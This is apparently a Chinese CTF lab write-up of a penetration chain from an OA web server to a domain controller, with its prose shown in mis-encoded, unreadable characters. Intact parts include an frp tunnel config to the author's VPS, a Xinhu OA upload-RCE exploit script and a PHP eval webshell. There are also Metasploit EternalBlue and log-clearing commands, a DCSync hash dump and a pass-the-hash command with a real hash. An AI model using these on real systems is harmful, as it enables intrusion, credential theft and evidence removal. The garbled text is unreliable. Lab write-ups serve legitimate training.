<p>äºæ˜¯æˆ‘ä»¬æœé›†åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><blockquote><p>172.22.1.2:DCåŸŸæ§<br>172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´<br>172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ</p></blockquote><p>è€Œæˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡å³ä¸º <code>DC</code> åŸŸæ§<br>æˆ‘ä»¬æœå…ˆæ˜¯å¯¹ <code>OA</code> åŠå…¬ç³»ç»Ÿè¿›è¡Œæ”»å‡»ï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬è¦å…ˆè¿›è¡Œå†…ç½‘ç©¿é€ï¼Œå…¶ç›®çš„æ˜¯ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨æ”»å‡»æœºè®¿é—®å†…ç½‘çš„æœåŠ¡ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€å° <code>vps</code> å’Œå·¥å…· <code>frp</code>ï¼Œå­¦è¿‡webçš„å¸ˆå‚…éƒ½çŸ¥é“ <code>vps</code> æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œå°±ä¸åšè§£é‡Šï¼Œ<code>frp</code> çš„ç›¸å…³çŸ¥è¯†ä¹Ÿè¯·è¯»è€…è‡ªè¡Œå­¦ä¹ ï¼Œè¿™é‡Œåªåšç®€å•çš„ä»‹ç»ã€‚<code>frp</code>çš„ä¸‹è½½åœ°å€ä¸ºï¼Œæœ‰linuxå’Œwindowsç‰ˆæœ¬ï¼š<br><a href="https://github.com/fatedier/frp">fatedier&#x2F;frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com)</a><br>è¯¥å·¥å…·çš„ç›®å½•å¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å…¶ä¸­ <code>frpc</code> å’Œ <code>frps</code> æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å°† <code>frps</code> å’Œ <code>frps.ini</code> ä¸Šä¼ åˆ°æˆ‘ä»¬çš„ <code>vps</code>ï¼Œ<code>frpc</code><br>å’Œ <code>frpc.ini</code> ä¸Šä¼ åˆ°æˆ‘ä»¬çš„é¶æœº<br>ä¸‹é¢æ˜¯æˆ‘ç›¸å…³æ–‡ä»¶çš„é…ç½®<br>frpc.iniï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 120.46.199.181 # æˆ‘vpsçš„ipåœ°å€</span><br><span class="line">server_port = 7000  </span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type = tcp   </span><br><span class="line">plugin = socks5  </span><br><span class="line">remote_port = 798</span><br></pre></td></tr></table></figure><p>frps.iniï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦ç¡®ä¿ä½ çš„ <code>vps</code> å¼€å¯äº† <code>7000</code> å’Œ <code>798</code> ç«¯å£<br>ç„¶ååœ¨é¶æœºæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>åœ¨ <code>vps</code> æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨æ”»å‡»æœºä½ è‡ªå·±çš„ç”µè„‘ä¸Šï¼ˆ<code>windows</code>ï¼Œä¸æ˜¯ <code>kali</code>ï¼Œ<code>kali</code> çš„é…ç½®æ–¹æ³•åœ¨åé¢æœ‰è®²ï¼‰ä½¿ç”¨ <code>Proxy Servers</code> é…ç½® <code>socks5</code> ä»£ç†å³å¯</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å…¶åŸç†æˆ‘ä¸æ‡‚ï¼Œå­¦é™¢åˆ°ç°åœ¨è¿˜æ²¡æœ‰æ•™è®¡ç®—æœºç½‘ç»œï¼ŒåŠ ä¸Šæˆ‘ä¸€ä¸ªçº¯pwnæ‰‹ä¹Ÿæ²¡å»ç ”ç©¶è¿™ç§ä¸œè¥¿ï¼ˆå…¶å®æ˜¯æˆ‘æ‡’ï¼‰ï¼Œè¯·å¸ˆå‚…ä»¬è½»ç‚¹éª‚ :-(<br>æœ€åè¿˜è¦åœ¨ <code>Proxy Servers</code> ä¸Šé…ç½®ä¸€ä¸‹ <code>Proxificantion Rule</code>ï¼Œå§é™¤äº†åˆšé…ç½®çš„é‚£ä¸€é¡¹ä»¥å¤–çš„å…¨éƒ¨å‹¾å‹¾å»æ‰ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šè®¿é—®ä¸äº†ï¼ŒåŸç†è¿˜æ˜¯ä¸çŸ¥é“ğŸ¤”<br>é…ç½®å®Œåå°±èƒ½ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ <code>172.22.1.18</code> è¿›è¡Œè®¿é—®äº†ï¼Œå¯ä»¥çœ‹åˆ°è¯¥ç³»ç»Ÿçš„ç‰ˆæœ¬æ˜¯ <code>2.2.8</code> ï¼ˆè¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œå¯ä»¥é€šè¿‡æœç´¢ç³»ç»Ÿçš„ç‰ˆæœ¬å·çœ‹çœ‹æœ‰æ²¡æœ‰å·²ç»ç»™å‘ç°çš„æ¼æ´ï¼‰</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/18.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¼±å£ä»¤ï¼Œadmin&#x2F;admin123ã€‚</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/19.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç™»å½•åå°±æ˜¯ <code>web</code> æ‰‹çš„äº‹æƒ…äº†ï¼Œè¿™ä¸ªç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæœ‰ç›´æ¥çš„ <code>poc</code>ï¼Œè¿™é‡Œæˆ‘ç›´æ¥å‚è€ƒï¼š<br><a href="https://blog.csdn.net/solitudi/article/details/118675321">[ä»£ç å®¡è®¡]ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ2.2å­˜åœ¨æ–‡ä»¶ä¸Šä¼ é…åˆäº‘å¤„ç†å‡½æ•°ç»„åˆæ‹³RCE_ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿå¼±å£ä»¤-CSDNåšå®¢</a><br>exp.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;dGVzdA::&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWJjMTIz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;whoami&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›¸åŒç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª <code>1.php</code> æ–‡ä»¶å­˜çš„æ˜¯ä¸€å¥è¯æœ¨é©¬<br>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/20.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç„¶åç›´æ¥èšå‰‘è¿æ¥ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/21.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿æ¥æˆåŠŸï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/22.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°å·²ç»æ‹¥æœ‰äº† <code>system</code> æƒé™ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ <code>Administrator</code> ç”¨æˆ·çš„ç›®å½•ä¸‹æ‰¾åˆ° <code>flag2</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/23.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯¹ <code>ip 172.22.1.21</code> è¿›è¡Œæ¸—é€ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°æ¸—é€æ¡†æ¶ <code>Metasploit Framework</code>ï¼Œ<code>kali</code> è‡ªå¸¦è¿™ä¸ªæ¡†æ¶ï¼Œè¿™é‡Œçš„æ”»å‡»æœºæˆ‘é€‰ç”¨ <code>kali</code>ï¼ˆwindowsä¹Ÿå¯ä»¥å®‰è£…Metasploit Frameworkï¼Œä¸è¿‡ä¸Šé¢æˆ‘è¯´è¿‡ä¹Ÿè¦è®²è®²å¦‚ä½•åœ¨kaliè®¾ç½®ä»£ç†ï¼‰ã€‚æˆ‘ä»¬é¦–å…ˆè¦åœ¨ <code>kali</code> ä¸­è®¾ç½® <code>socks5</code> ä»£ç†ï¼Œå¦åˆ™æˆ‘ä»¬æ— æ³•è®¿é—®å…¶å†…ç½‘çš„ç¯å¢ƒã€‚<br>åœ¨ <code>kali</code> ä¸­è®¾ç½®ä»£ç†æ¯” <code>windows</code> ç®€å•å¾ˆå¤šï¼Œä»–è‡ªå¸¦äº†ä¸€ä¸ª <code>proxychains4</code> å·¥å…·ï¼Œæˆ‘ä»¬åªéœ€è¦ç¼–è¾‘ <code>etc</code> ç›®å½•ä¸‹çš„ <code>proxychians4.conf</code> æ–‡ä»¶ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/24.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åœ¨æœ€ä¸‹é¢çš„ <code>ProxyList</code> ä¸ŠåŠ ä¸Š <code>socks5 vps ip ç«¯å£</code> å³å¯  </p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/25.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç„¶åå°±èƒ½åœ¨æµè§ˆå™¨ä¸­è®¿é—®é¶æœºå†…ç½‘çš„ <code>172.22.1.*</code> é‚£ä¸‰å°æœºå™¨äº†<br>åœ¨ä¸Šé¢ç”¨ <code>fscan</code> çš„æ‰«æä¸­æˆ‘ä»¬å‘ç°è¯¥æœºå­å­˜åœ¨ <code>MS17-010</code> æ¼æ´ï¼Œè¿™ä¸ªå°±æ˜¯å¤§åé¼é¼çš„æ°¸æ’ä¹‹è“æ¼æ´<br>æˆ‘ä»¬å…ˆåœ¨ <code>kali</code> è¾“å…¥ <code>msfconsole</code> å¯åŠ¨ <code>Metasploit Framework</code> ï¼ˆåé¢ç®€ç§° <code>msf</code>ï¼‰</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/26.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§ç•Œé¢ååˆ†çš„é…·ç‚«ï¼Œè€Œä¸”æ¯æ¬¡å¯åŠ¨ <code>msf</code> æ—¶è¿™ä¸ªå›¾ç‰‡éƒ½ä¼šä¸ä¸€æ ·<br>è¾“å…¥ <code>search ms17-010</code> æœç´¢ <code>ms17-010</code> ç›¸å…³æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°ä¸€å…±æ‰¾åˆ°äº† <code>4</code> ä¸ªä¸åŒçš„æ¨¡å—ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/27.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºä»–å½±å“æ˜¯ç‰ˆæœ¬æ¯”è¾ƒå¤šï¼Œç„¶åæ¥ä¸‹æ¥ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥å‘èµ·æ°¸æ’ä¹‹è“æ”»å‡»ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue  <span class="comment"># é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="comment"># è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21  <span class="comment"># è®¾ç½®é¶æœºçš„ip</span></span><br><span class="line">exploit  <span class="comment"># å‘èµ·æ”»å‡»</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/28.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿è¡ŒæˆåŠŸä¼šå‡ºç°meterpreter&gt;<br>è¯¥ <code>Meterpreter</code> æ˜¯ <code>metasploit</code> çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œå¯ä»¥è°ƒç”¨ <code>metasploit</code> çš„ä¸€äº›åŠŸèƒ½ï¼Œå¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ›´æ·±å…¥çš„æ¸—é€ï¼Œå…¥è·å–å±å¹•ã€ä¸Šä¼ &#x2F;ä¸‹è½½æ–‡ä»¶ã€åˆ›å»ºæŒä¹…åé—¨ç­‰ã€‚<br>ä¸‹é¢ä»‹ç»ä¸€äº›è¯¥æ¨¡å—å¸¸ç”¨çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot <span class="comment"># æ•è·å±å¹•</span></span><br><span class="line">meterpreter &gt; upload hello.txt c:// <span class="comment">#ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">meterpreter &gt; download d://1.txt <span class="comment"># ä¸‹è½½æ–‡ä»¶</span></span><br><span class="line">meterpreter &gt; shell <span class="comment"># è·å–cmd</span></span><br><span class="line">meterpreter &gt; clearev <span class="comment"># æ¸…é™¤æ—¥å¿—</span></span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ä¸Šå›¾ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬å·²ç»æˆåŠŸçš„æ‰“è¿›è¯¥ä¸»æœºï¼Œé—æ†¾çš„æ˜¯è¯¥æœºå­ä¸Šå¹¶æ²¡æœ‰ <code>flag</code>  ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æœ€åçš„<code>flag</code> åœ¨ <code>windows DC</code> åŸŸæ§åˆ¶å™¨ä¸Šé¢<br>æ¥ä¸‹æ¥æ˜¯è¿›è¡Œ <code>DCSync</code> æ”»å‡»ï¼Œè¿™é‡Œç®€å•è§£é‡Šä¸€ä¸‹ï¼š<br>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯ <code>DCSync</code></p><blockquote><p>åœ¨åŸŸä¸­ï¼Œä¸åŒçš„åŸŸæ§ä¹‹é—´ï¼Œé»˜è®¤æ¯éš”15minå°±ä¼šè¿›è¡Œä¸€æ¬¡åŸŸæ•°æ®åŒæ­¥ã€‚å½“ä¸€ä¸ªé¢å¤–çš„åŸŸæ§æƒ³ä»å…¶ä»–åŸŸæ§åŒæ­¥æ•°æ®æ—¶ï¼Œé¢å¤–åŸŸæ§ä¼šåƒå…¶ä»–åŸŸæ§å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚åŒæ­¥æ•°æ®ã€‚å¦‚æœéœ€è¦åŒæ­¥çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œåˆ™ä¼šé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚DCSyncå°±æ˜¯åˆ©ç”¨è¿™ä¸ªåŸç†ï¼Œé€šè¿‡ç›®å½•å¤åˆ¶æœåŠ¡ï¼ˆDirectory Replication Serviceï¼ŒDRSï¼‰çš„GetNCChangesæ¥å£åƒåŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ï¼Œä»¥è·å¾—æŒ‡å®šåŸŸæ§ä¸Šçš„æ´»åŠ¨ç›®å½•æ•°æ®ã€‚ç›®å½•å¤åˆ¶æœåŠ¡ä¹Ÿæ˜¯ä¸€ç§ç”¨äºåœ¨æ´»åŠ¨ç›®å½•ä¸­å¤åˆ¶å’Œç®¡ç†æ•°æ®çš„RPCåè®®ã€‚è¯¥åè®®ç”±ä¸¤ä¸ªRPCæ¥å£ç»„æˆã€‚åˆ†åˆ«æ˜¯drsuapiå’Œdsaopã€‚<br>DCSyncæ˜¯mimikatzåœ¨2015å¹´æ·»åŠ çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”±Benjamin DELPY gentilkiwiå’ŒVincent LE TOUXå…±åŒç¼–å†™ï¼Œèƒ½å¤Ÿç”¨æ¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>DCSync</code> æ¥å¯¼å‡ºæ‰€æœ‰ç”¨æˆ·çš„ <code>hash</code> ç„¶åè¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œè¦æƒ³ä½¿ç”¨ <code>DCSync</code> å¿…é¡»è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</p><blockquote><p>Administrators ç»„å†…çš„ç”¨æˆ·<br>Domain Admins ç»„å†…çš„ç”¨æˆ·<br>Enterprise Admins ç»„å†…çš„ç”¨æˆ·åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</p></blockquote><p>ç°åœ¨æˆ‘ä»¬å›åˆ°ä¸€å¼€å§‹ <code>fscan</code> çš„æ‰«æç»“æœï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/29.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç”¨æ°¸æ’ä¹‹è“æ‰“ä¸‹çš„è¿™å°æœºå­æ˜¯ <code>enterprise</code> ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯è¯´æ»¡è¶³ <code>DCSync</code> æ”»å‡»çš„æ¡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨ <code>msf</code> ä¸­ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥è·å–ç”¨æˆ·çš„ <code>hash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi  <span class="comment"># è°ƒç”¨mimikatzæ¨¡å—</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span>  <span class="comment"># å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼)</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/30.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œæˆ‘ä»¬æ¯”è¾ƒå…³æ³¨æ˜¯ <code>Administrator</code> ç”¨æˆ·çš„ <code>hash</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>crackmapexec</code> æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° <code>DCåŸŸæ§</code> ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥è·å– <code>flag3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/31.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æœ€ç»ˆ <code>flag</code> ä¸º <code>flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</code></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ„Ÿè§‰è¿™ç§æ¸—é€å’Œç©¿é€çš„webè¿˜æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œä»å¤–ç½‘æ‰“è¿›å†…ç½‘çš„è¿‡ç¨‹è¦ç¬¬ä¸€æ­¥è¦åšçš„ä¸æ˜¯è‡ªå·±å»å¯»æ‰¾å’Œæ—¥æ¼æ´ï¼Œè€Œæ˜¯çœ‹çœ‹ç³»ç»Ÿæœ‰æ²¡æœ‰å†å²é—ç•™çš„æ¼æ´ä»¥åŠæ˜¯å¦æœ‰ç°æˆçš„expè¿›è¡Œæ”»å‡»ã€‚æ‰“å›½å†³çš„æ—¶å€™æœ‰çš„é˜Ÿä¼æ‹¿ç€ç°æˆçš„expç›´æ¥å¼€å±€2åˆ†é’Ÿå°±æ‰“è¿›å†…ç½‘äº†ï¼Œè€Œæˆ‘ä»¬é˜Ÿä¼å°±å’Œåšä¼ ç»Ÿwebé¢˜ç›®ä¸€æ ·ä¸€æ­¥ä¸€æ­¥çš„æ‰“ï¼Œè€—è´¹äº†å¾ˆå¤šæ—¶é—´æ‰æ‰“è¿›å»ï¼Œéå¸¸çš„åƒäºã€‚<br>åœ¨æ‰“è¿™ä¸ªé¶åœºä¸­èŠ±è´¹æ—¶é—´æœ€å¤šçš„æ˜¯ç”¨ <code>frp</code> è¿›è¡Œå†…ç½‘ç©¿é€ï¼Œä¸»è¦æ˜¯æˆ‘ç†è§£èƒ½åŠ›æ¯”è¾ƒå·®ï¼Œç½‘ä¸Šçš„æ–‡ç« çœ‹çš„ä¼¼æ‡‚éæ‡‚çš„ã€‚æœŸé—´è¿˜è¯·æ•™äº†unknownå¸ˆå‚…å’Œpanz0eå¸ˆå‚…ï¼Œç„¶åæŸäººå°±å› ä¸ºè¿™ä»¶äº‹æƒ…æ²¡å®Œæˆä¸Šç­ä»»åŠ¡ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/32.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è™½ç„¶é¶åœºæ¯”è¾ƒç®€å•ï¼Œå¯æ˜¯è¿˜æ˜¯èŠ±è´¹äº†æˆ‘è®¸å¤šçš„æ—¶é—´ï¼Œè¿˜æ˜¯Csomeå¸ˆå…„è¯´çš„é‚£å¥è¯ï¼šâ€œèœå°±å¤šç»ƒâ€ï¼Œè¿™ä¸€å¹´æ‰“ç®—å¤šç»ƒç»ƒæ¸—é€ï¼Œå¸Œæœ›æ˜å¹´å›½èµ›ä¸ä¼šç•™ä¸‹é—æ†¾<br>å‚è€ƒï¼š<br><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">åŸŸæ¸—é€â€”â€”DCSync (3gstudent.github.io)</a><br><a href="https://blog.csdn.net/weixin_63576152/article/details/133462469">æ˜¥ç§‹äº‘å¢ƒInitial-WPï¼ˆé™„å¸¦è¯¦ç»†ä»£ç†è¿‡ç¨‹ï¼‰_lnitialé¶æœº-CSDNåšå®¢</a><br><a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010ï¼ˆEternal 